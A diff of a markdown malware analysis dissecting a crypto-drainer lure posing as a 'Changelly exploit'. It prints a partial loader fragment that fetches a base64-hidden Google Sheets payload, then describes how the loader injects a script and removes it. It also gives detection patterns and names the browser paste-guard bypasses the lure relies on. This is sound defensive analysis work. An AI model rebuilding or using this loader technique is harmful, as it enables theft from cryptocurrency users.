@@ -1,30 +1,97 @@
-# "Changelly Exploit" — analysis of a first-stage drainer loader
+# "Changelly Exploit" — deep dive on a first-stage drainer loader
 
-Analysis date: 2026-10-18. **Static analysis only. Nothing was executed and
-nothing was fetched.**
+Analysis first recorded 2026-10-18; deep dive and two-stage preservation
+completed 2026-10-23. **Static analysis only. Nothing was executed and the
+second-stage payload was not fetched.**
 
-Preservation bag: `node tools/build_changelly_drainer_xena.mjs` writes a
-BagIt bag to `dist/changelly-drainer-xena/` (gitignored). Tests:
-`tests/changelly-drainer-xena.test.mjs`.
+Build the preservation package with:
 
-## Source object
+```sh
+npm run build:changelly-xena
+node --test tests/changelly-drainer-xena.test.mjs
+```
 
-A PDF titled `Changelly Exploit.pdf` on Google Drive
-(`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d`, 490,147 bytes, text-extractable). It
-claims that an internal developer loader is still reachable on changelly.com,
-that it will load a deprecated "node v3.27" behind the password `admin`, and
-that swaps of BTC, LTC, ETH, XMR or SOL above $200 then pay out roughly 50%
-above the live rate. It walks the reader through pasting a `javascript:`
-payload into the address bar.
+That produces, under gitignored `dist/`:
 
-Its instructions are not reproduced here or in the bag. Redistributing the lure
-helps the attacker, not the record.
+```text
+dist/changelly-drainer-xena/          stage 1: BagIt 1.0 bag (directory)
+dist/changelly-drainer-xena.zip       stage 2a: serialized BagIt bag
+dist/changelly-drainer-xena.xena      stage 2b: Xena binary record wrapping the ZIP
+dist/changelly-drainer-xena.xena.json sidecar pinning every stage by SHA-256
+```
 
-## The loader
+## Link supplied for this round — and what it actually is
+
+The upload link supplied alongside this request points at Google Drive file
+`1qAW9XeLg8t5ZI9v2c9a80TExHFhi_heV`. In this repository's own Drive records
+that ID is `Html5-worktree-2026-09-27-12c463f.tar.gz` — the Chipwright
+worktree snapshot from the restore work on PR #134 — **not** the Changelly
+material. It was therefore not used as evidence here.
+
+The Changelly source object on record remains the earlier one: a PDF titled
+`Changelly Exploit.pdf` on Google Drive (`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d`,
+490,147 bytes, text-extractable). The analysis below is built from the loader
+recovered from that document and preserved in the repository, with all hashes
+re-verified locally in Python and Node.
+
+## Executive verdict
+
+This is **not** a Changelly arbitrage exploit. It is a first-stage
+remote-code loader delivered by a social-engineering lure:
+
+1. a Changelly-looking URL carries an opaque base64 suffix;
+2. the suffix — not the Changelly prefix — is decoded and fetched;
+3. the fetch target is a Google Sheets `gviz/tq` query;
+4. two attacker-controlled cells (`node`, `path`) are concatenated;
+5. the result is injected as a `<script>` element and executed in the page;
+6. the element is removed, erasing the visible trace.
+
+Confidence is **high** for the delivery mechanism, because every step is
+visible in the recovered first-stage source. Confidence is deliberately
+**not claimed** for the second stage's exact behaviour — which exchange
+calls, wallet prompts, or exfiltration it performs — because that payload was
+never retrieved. Preserving it as a *location* rather than fetching it is the
+defensible archival choice: the operator can rewrite those cells at any
+moment, so any fetched copy would be a snapshot of a moving target, and
+retrieving live drainer code serves no defensive purpose the static record
+does not already provide.
+
+## Source object and claims
+
+The cover PDF claims that an internal developer loader is still reachable on
+changelly.com, that it will load a deprecated "node v3.27" behind the password
+`admin`, and that swaps of BTC, LTC, ETH, XMR or SOL above $200 then pay out
+roughly 50% above the live rate. It walks the reader through running a
+`javascript:` payload manually.
+
+Those operating instructions are **not reproduced** here or in the bag.
+Redistributing the lure helps the attacker, not the record. The claims are
+recorded as claims; the code is what was analysed.
+
+## The loader, deconstructed
+
+Recovered first stage (fragment — the full text is preserved inert in the
+bag):
 
 ```
 (async()=>{const URL="https://docs.changelly.com/development/authentication?=<base64>",
  r=await fetch(atob(URL.split("authentication?=")[1])), ...
+```
+
+Data flow:
+
+```
+lure -> manual run in a page context
+     -> split carrier string on "authentication?="
+     -> atob(suffix)
+     -> fetch(Google Sheets gviz URL)
+     -> match google.visualization.Query.setResponse(...)
+     -> JSON.parse the capture
+     -> rows -> Map { "node" -> B, "path" -> B }
+     -> node + path
+     -> script.textContent = result
+     -> appendChild(script)   [executes]
+     -> script.remove()
 ```
 
 Step by step:
@@ -32,7 +99,7 @@ Step by step:
 1. Split the URL string on `authentication?=` and keep everything after it.
 2. `atob` that suffix. **This is the real fetch target.**
 3. `fetch` it — the `gviz` query endpoint of a published Google Sheet.
-4. Match `googlevisualizationQuerysetResponse`, `JSON.parse` the payload.
+4. Match `google.visualization.Query.setResponse`, `JSON.parse` the payload.
 5. Index the rows by column A, taking column B as the value.
 6. Concatenate the `node` and `path` values into one string.
 7. Create a `<script>` element, set `textContent` to that string, append it.
@@ -50,76 +117,205 @@ The base64 blob itself is pinned at SHA-256
 decoded independently in Python and Node and agree byte for byte; the builder
 fails closed if either pin drifts.
 
+## Why the Changelly domain is camouflage
+
+`fetch` receives the base64-decoded suffix, so
+`docs.changelly.com/development/authentication` is **never requested**. It
+exists so that a victim glancing at the string sees a plausible vendor
+domain, and so the string survives casual inspection. The bytes go to
+`docs.google.com`. There is no Changelly vulnerability in this mechanism at
+all — Changelly is set dressing.
+
+## The spreadsheet as payload infrastructure
+
+Three properties make a published Sheet effective drainer infrastructure:
+
+- **Mutable after distribution.** Rewriting the `node`/`path` cells changes
+  what every holder of the loader executes, with no change to the document
+  being circulated.
+- **Split assembly.** `node` + `path` concatenated means no single cell holds
+  a complete, greppable script, which defeats naive content scanning.
+- **Boring legitimacy.** `docs.google.com` is allowlisted almost everywhere;
+  the `gviz/tq` endpoint with `sheet=API` and a SQL-like `tq` query reads as
+  ordinary application plumbing.
+
+The query itself is precise: `headers=1` drops the header row, and
+`select A,B where A='node' or A='path'` returns exactly the two payload cells
+and nothing else to explain them.
+
+## Parser fragility and operator tradecraft
+
+The loader assumes the delimiter exists, the base64 decodes, the response
+matches its `google.visualization.Query.setResponse` regular expression, and
+every returned row has non-null `c[0].v` / `c[1].v`. Violate any assumption
+and it throws or returns silently. There is no signature check, no hash pin
+on the payload, and no error reporting.
+
+That brittleness is consistent with disposable campaign infrastructure: a
+broken spreadsheet or lure copy is cheap to replace, successful runs leave
+almost nothing on the page, and the operator gets no telemetry debt. It is
+not the shape of a maintained internal tool.
+
+## Execution context: why self-XSS is the whole attack
+
+The delivery is textbook **self-XSS**. The code only becomes dangerous when a
+person runs it inside a page where they hold a valuable session — precisely
+the context the lure steers toward. Once appended, the injected script is
+ordinary page script: it inherits the origin's DOM and same-origin
+privileges. HttpOnly cookies limit direct cookie *reading*, but they do not
+neutralise an in-page script that can act through the application itself.
+
+Browser defences exist exactly here — pasted `javascript:` schemes are
+stripped or blocked, consoles warn before pasting — and the cover document's
+energy goes into talking the reader past those specific guards. That, more
+than the rate story, is the tell: legitimate tooling never needs its user to
+dismantle the browser's paste protections first.
+
 ## Why this is a drainer and not an arbitrage bug
 
-**The Changelly domain is camouflage.** `fetch` receives the base64-decoded
-suffix, so `docs.changelly.com/development/authentication` is never requested.
-It exists so that a victim glancing at the string sees a plausible vendor
-domain. The bytes go to `docs.google.com`.
+- **The economics are bait.** An unpatched, publicly reachable ~50% arbitrage
+  on a major exchange closes in minutes, not months. The $200 floor and the
+  five named sending assets exist to get real funds committed before the
+  payload runs.
+- **The mechanism is not credible.** A dev loader gated on the password
+  `admin`, reachable from a production frontend, loading a deprecated rate
+  node that then answers live swaps, is not how exchange pricing works.
+  "Locked in when the transaction is created" exists to make a fabricated
+  payout feel committed.
+- **Execute, then clean up.** Appending a `<script>` with `textContent` set
+  runs it synchronously; `el.remove()` afterwards removes the visible
+  evidence. Legitimate developer tooling does neither.
 
-**The payload is remote and swappable.** The attacker controls the spreadsheet.
-Rewriting the `node` and `path` cells changes what every holder of the
-bookmarklet executes, with no change to the document being circulated. This is
-why the bag records a *location* and not a payload — and why that location
-should be treated as hostile and live.
+## Attack chain, with evidence status
 
-**Splitting the payload across two cells is deliberate.** `node` + `path`
-concatenated means no single cell holds a complete, greppable script, which
-defeats naive content scanning of the sheet.
+| # | Stage | Status |
+| - | ----- | ------ |
+| 1 | Lure document distributed | Documented from the cover PDF |
+| 2 | Victim manually runs the loader (self-XSS) | Observed in loader design |
+| 3 | Base64 locator decoded; Changelly prefix discarded | Observed |
+| 4 | Google Sheets payload queried | Mechanism observed; response not retrieved |
+| 5 | `node` + `path` assembled into a script | Observed |
+| 6 | Script injected, executed, element removed | Observed |
+| 7 | Financial theft via the second stage | Objective inferred from the lure; behaviour unobserved |
 
-**Execute, then clean up.** Appending a `<script>` with `textContent` set runs
-it synchronously; `el.remove()` afterwards removes the visible evidence.
-Legitimate developer tooling does neither.
-
-**The delivery is textbook self-XSS.** Browsers refuse to run pasted
-`javascript:` URLs precisely to prevent this. The document's insistence that
-the prefix be typed by hand, that the globe suggestion be picked rather than
-Search, and that Firefox's `allow pasting` guard be overridden is a set of
-instructions for dismantling those specific protections.
-
-**The economics are bait.** An unpatched, publicly reachable ~50% arbitrage on
-a major exchange closes in minutes, not months. The $200 floor and the five
-named sending assets exist to get real funds committed before the payload runs.
-
-**The mechanism is not credible.** A dev loader gated on the password `admin`
-and reachable from a production frontend, loading a deprecated rate node that
-then answers live swaps, is not how exchange pricing works. "Locked in when the
-transaction is created" exists to make a fabricated payout feel committed.
+The same chain is in the bag as `data/normalized/attack-chain.json`, with the
+evidence status carried per stage so a future reader cannot mistake stage 7
+for something this artifact proves.
 
 ## Detection
 
-- `fetch()` of `docs.google.com/spreadsheets/*/gviz/tq` from an exchange origin
+Highest signal first:
+
+- `fetch()` of `docs.google.com/spreadsheets/*/gviz/tq` from an exchange or
+  finance origin
 - base64 decode of a substring split off a URL containing `authentication?=`
-- `document.createElement('script')` with `textContent` assigned from network data
-- a script element appended and then immediately removed
-- a `javascript:` URL executed from the address bar
-- `allow pasting` typed into a browser console
+- script or network text containing `google.visualization.Query.setResponse`
+  together with row keys `node` / `path`
+- `document.createElement('script')` with `textContent` assigned from network
+  data, appended and then immediately removed
+- a `javascript:` URL executed from the address bar, or `allow pasting` typed
+  into a browser console, in the same report as a rate-"node" claim
+
+The bag carries a YARA rule and proxy/browser hunt text in
+`data/normalized/detection-rules.txt`. A Sheets query alone is not malicious;
+the high-signal case is the exchange context plus the manual-paste story.
 
 ## If you ran it
 
-Treat any wallet or exchange session in that browser as compromised. Move funds
-from a clean device, rotate API keys, revoke sessions, and do not reuse that
-browser profile.
+Treat any wallet or exchange session in that browser as compromised. Move
+funds from a clean device, rotate API keys, revoke sessions, review connected
+applications and withdrawal addresses, and do not reuse that browser profile.
+Preserve the lure document, timestamps, and transaction identifiers for the
+venue's security team. Do not run the loader again "to see what happens".
+
+## Preservation format
+
+### Stage 1 — BagIt (RFC 8493)
+
+`dist/changelly-drainer-xena/` is a BagIt 1.0 bag:
+
+```text
+bagit.txt
+bag-info.txt                        Payload-Oxum: 22294.7 (this build)
+manifest-sha256.txt                 SHA-256 for every payload file
+tagmanifest-sha256.txt              SHA-256 for the tag files
+data/
+  original/
+    loader-bookmarklet.txt          the first-stage loader, inert (.txt)
+  normalized/
+    loader-analysis.md              the original 2026-10-18 analysis
+    deep-dive.md                    this deep dive, condensed for the bag
+    attack-chain.json               the chain above, evidence status per stage
+    detection-rules.txt             YARA + hunt queries
+    ioc.json                        machine-readable indicators and pins
+    loader-decoded.json             decoded locator, field by field
+metadata/
+  preservation-event.json           events, exclusions, and format honesty
+```
+
+### Stage 2 — Xena preservation format
+
+The completed bag is serialized to `dist/changelly-drainer-xena.zip`
+(entries sorted, timestamps fixed, so the bytes are reproducible), and those
+ZIP bytes are wrapped in `dist/changelly-drainer-xena.xena`: a Xena
+binary-normalisation record using the documented **Default Package Wrapper**
+and **Binary object** schemas —
+
+```xml
+<xena xmlns="http://preservation.naa.gov.au/xena/1.0">
+  <meta_data>
+    <meta_data_wrapper_name>Default Package Wrapper</meta_data_wrapper_name>
+    <normaliser_name>au.gov.naa.digipres.xena.kernel.normalise.BinaryToXenaBinaryNormaliser</normaliser_name>
+    <input_source_uri>urn:shdwelf:html5:changelly-drainer:bagit-bag-2026-10-18</input_source_uri>
+  </meta_data>
+  <content>
+    <binary-object:binary-object xmlns:binary-object="http://preservation.naa.gov.au/binary-object/1.0" …>
+      …Base64 of the BagIt ZIP, 76-column lines…
+    </binary-object:binary-object>
+  </content>
+</xena>
+```
+
+— the same shape this repository's Red October viewer emits. Stated plainly,
+as the sidecar also states: the record is **hand-built to those documented
+schemas by the builder tool; it was not produced or validated by a National
+Archives of Australia Xena installation** (`processedByXena: false`).
+`dist/changelly-drainer-xena.xena.json` pins the bag's Payload-Oxum, the
+ZIP (bytes + SHA-256), and the Xena record (bytes + SHA-256). Decoding the
+record's Base64 reproduces the serialized bag byte for byte; a test asserts
+exactly that.
 
 ## Scope limits, stated plainly
 
 - **The spreadsheet was not fetched.** Retrieving an attacker's live payload
-  serves no defensive purpose that static analysis does not already provide,
-  and `docs.google.com` is not in this sandbox's outbound allowlist regardless.
-- **The second-stage payload is not in the bag** and never was.
+  serves no defensive purpose that static analysis does not already provide.
+- **The second-stage payload is not in the bag** and never was; it is recorded
+  as a location.
+- **The cover document's lure instructions are not reproduced**, and a test
+  fails the build if their distinctive phrases appear in the bag.
+- **The loader is stored as `.txt`.** No file in the bag carries an extension
+  a browser or shell would execute, and a test asserts that.
 - **Ghidra does not apply.** It analyses native binaries; this is JavaScript.
-  The repository's Ghidra-WASM path (`tools/decompile_mz.mjs`) parses MZ images
-  and has nothing to say about a bookmarklet. Ghidra proper also cannot run in
-  this sandbox — no `ghidra`/`analyzeHeadless` on PATH, the vendored
-  `wasm/ghidra/` decompiler ships only Atmel and x86 processor specs, and
-  JDK 21 (required by Ghidra 12.x) fails to start here with
-  `Failed setting boot class path`.
-- **The loader is stored as `.txt`.** No file in the bag carries an extension a
-  browser or shell would execute, and a test asserts that.
+  The repository's Ghidra-WASM path (`tools/decompile_mz.mjs`) parses MZ
+  images and has nothing to say about a bookmarklet.
+
+## References
+
+- BagIt File Packaging Format, RFC 8493 — <https://www.rfc-editor.org/rfc/rfc8493.html>
+- Google Visualization API Query Language (`tq`, `gviz`) —
+  <https://developers.google.com/chart/interactive/docs/querylanguage>
+- Google Visualization datasource protocol / `setResponse` format —
+  <https://developers.google.com/chart/interactive/docs/dev/implementing_data_source>
+- Xena schemas (Default Package Wrapper, Binary object) —
+  <https://sourceforge.net/p/xena/wiki/Xena_schemas/>
+- Xena, National Archives of Australia digital-preservation software —
+  <https://coptr.digipres.org/index.php/Xena>
 
 ## Relation to the earlier position
 
-This is the same line held on the PDF when it first appeared: investigate and
-document, do not operationalise. What changed is that the payload was
-recovered, so the analysis can now be specific about mechanism rather than
-inferring intent from the delivery method.
+This is the same line held on the PDF when it first appeared (PR #125,
+2026-10-18): investigate and document, do not operationalise. What changed
+since is depth and packaging — the mechanism is now reconstructed stage by
+stage with its evidence status labelled, and the whole record is preserved
+first as a BagIt bag and then in Xena preservation format, so the analysis
+survives independent of this repository's layout.
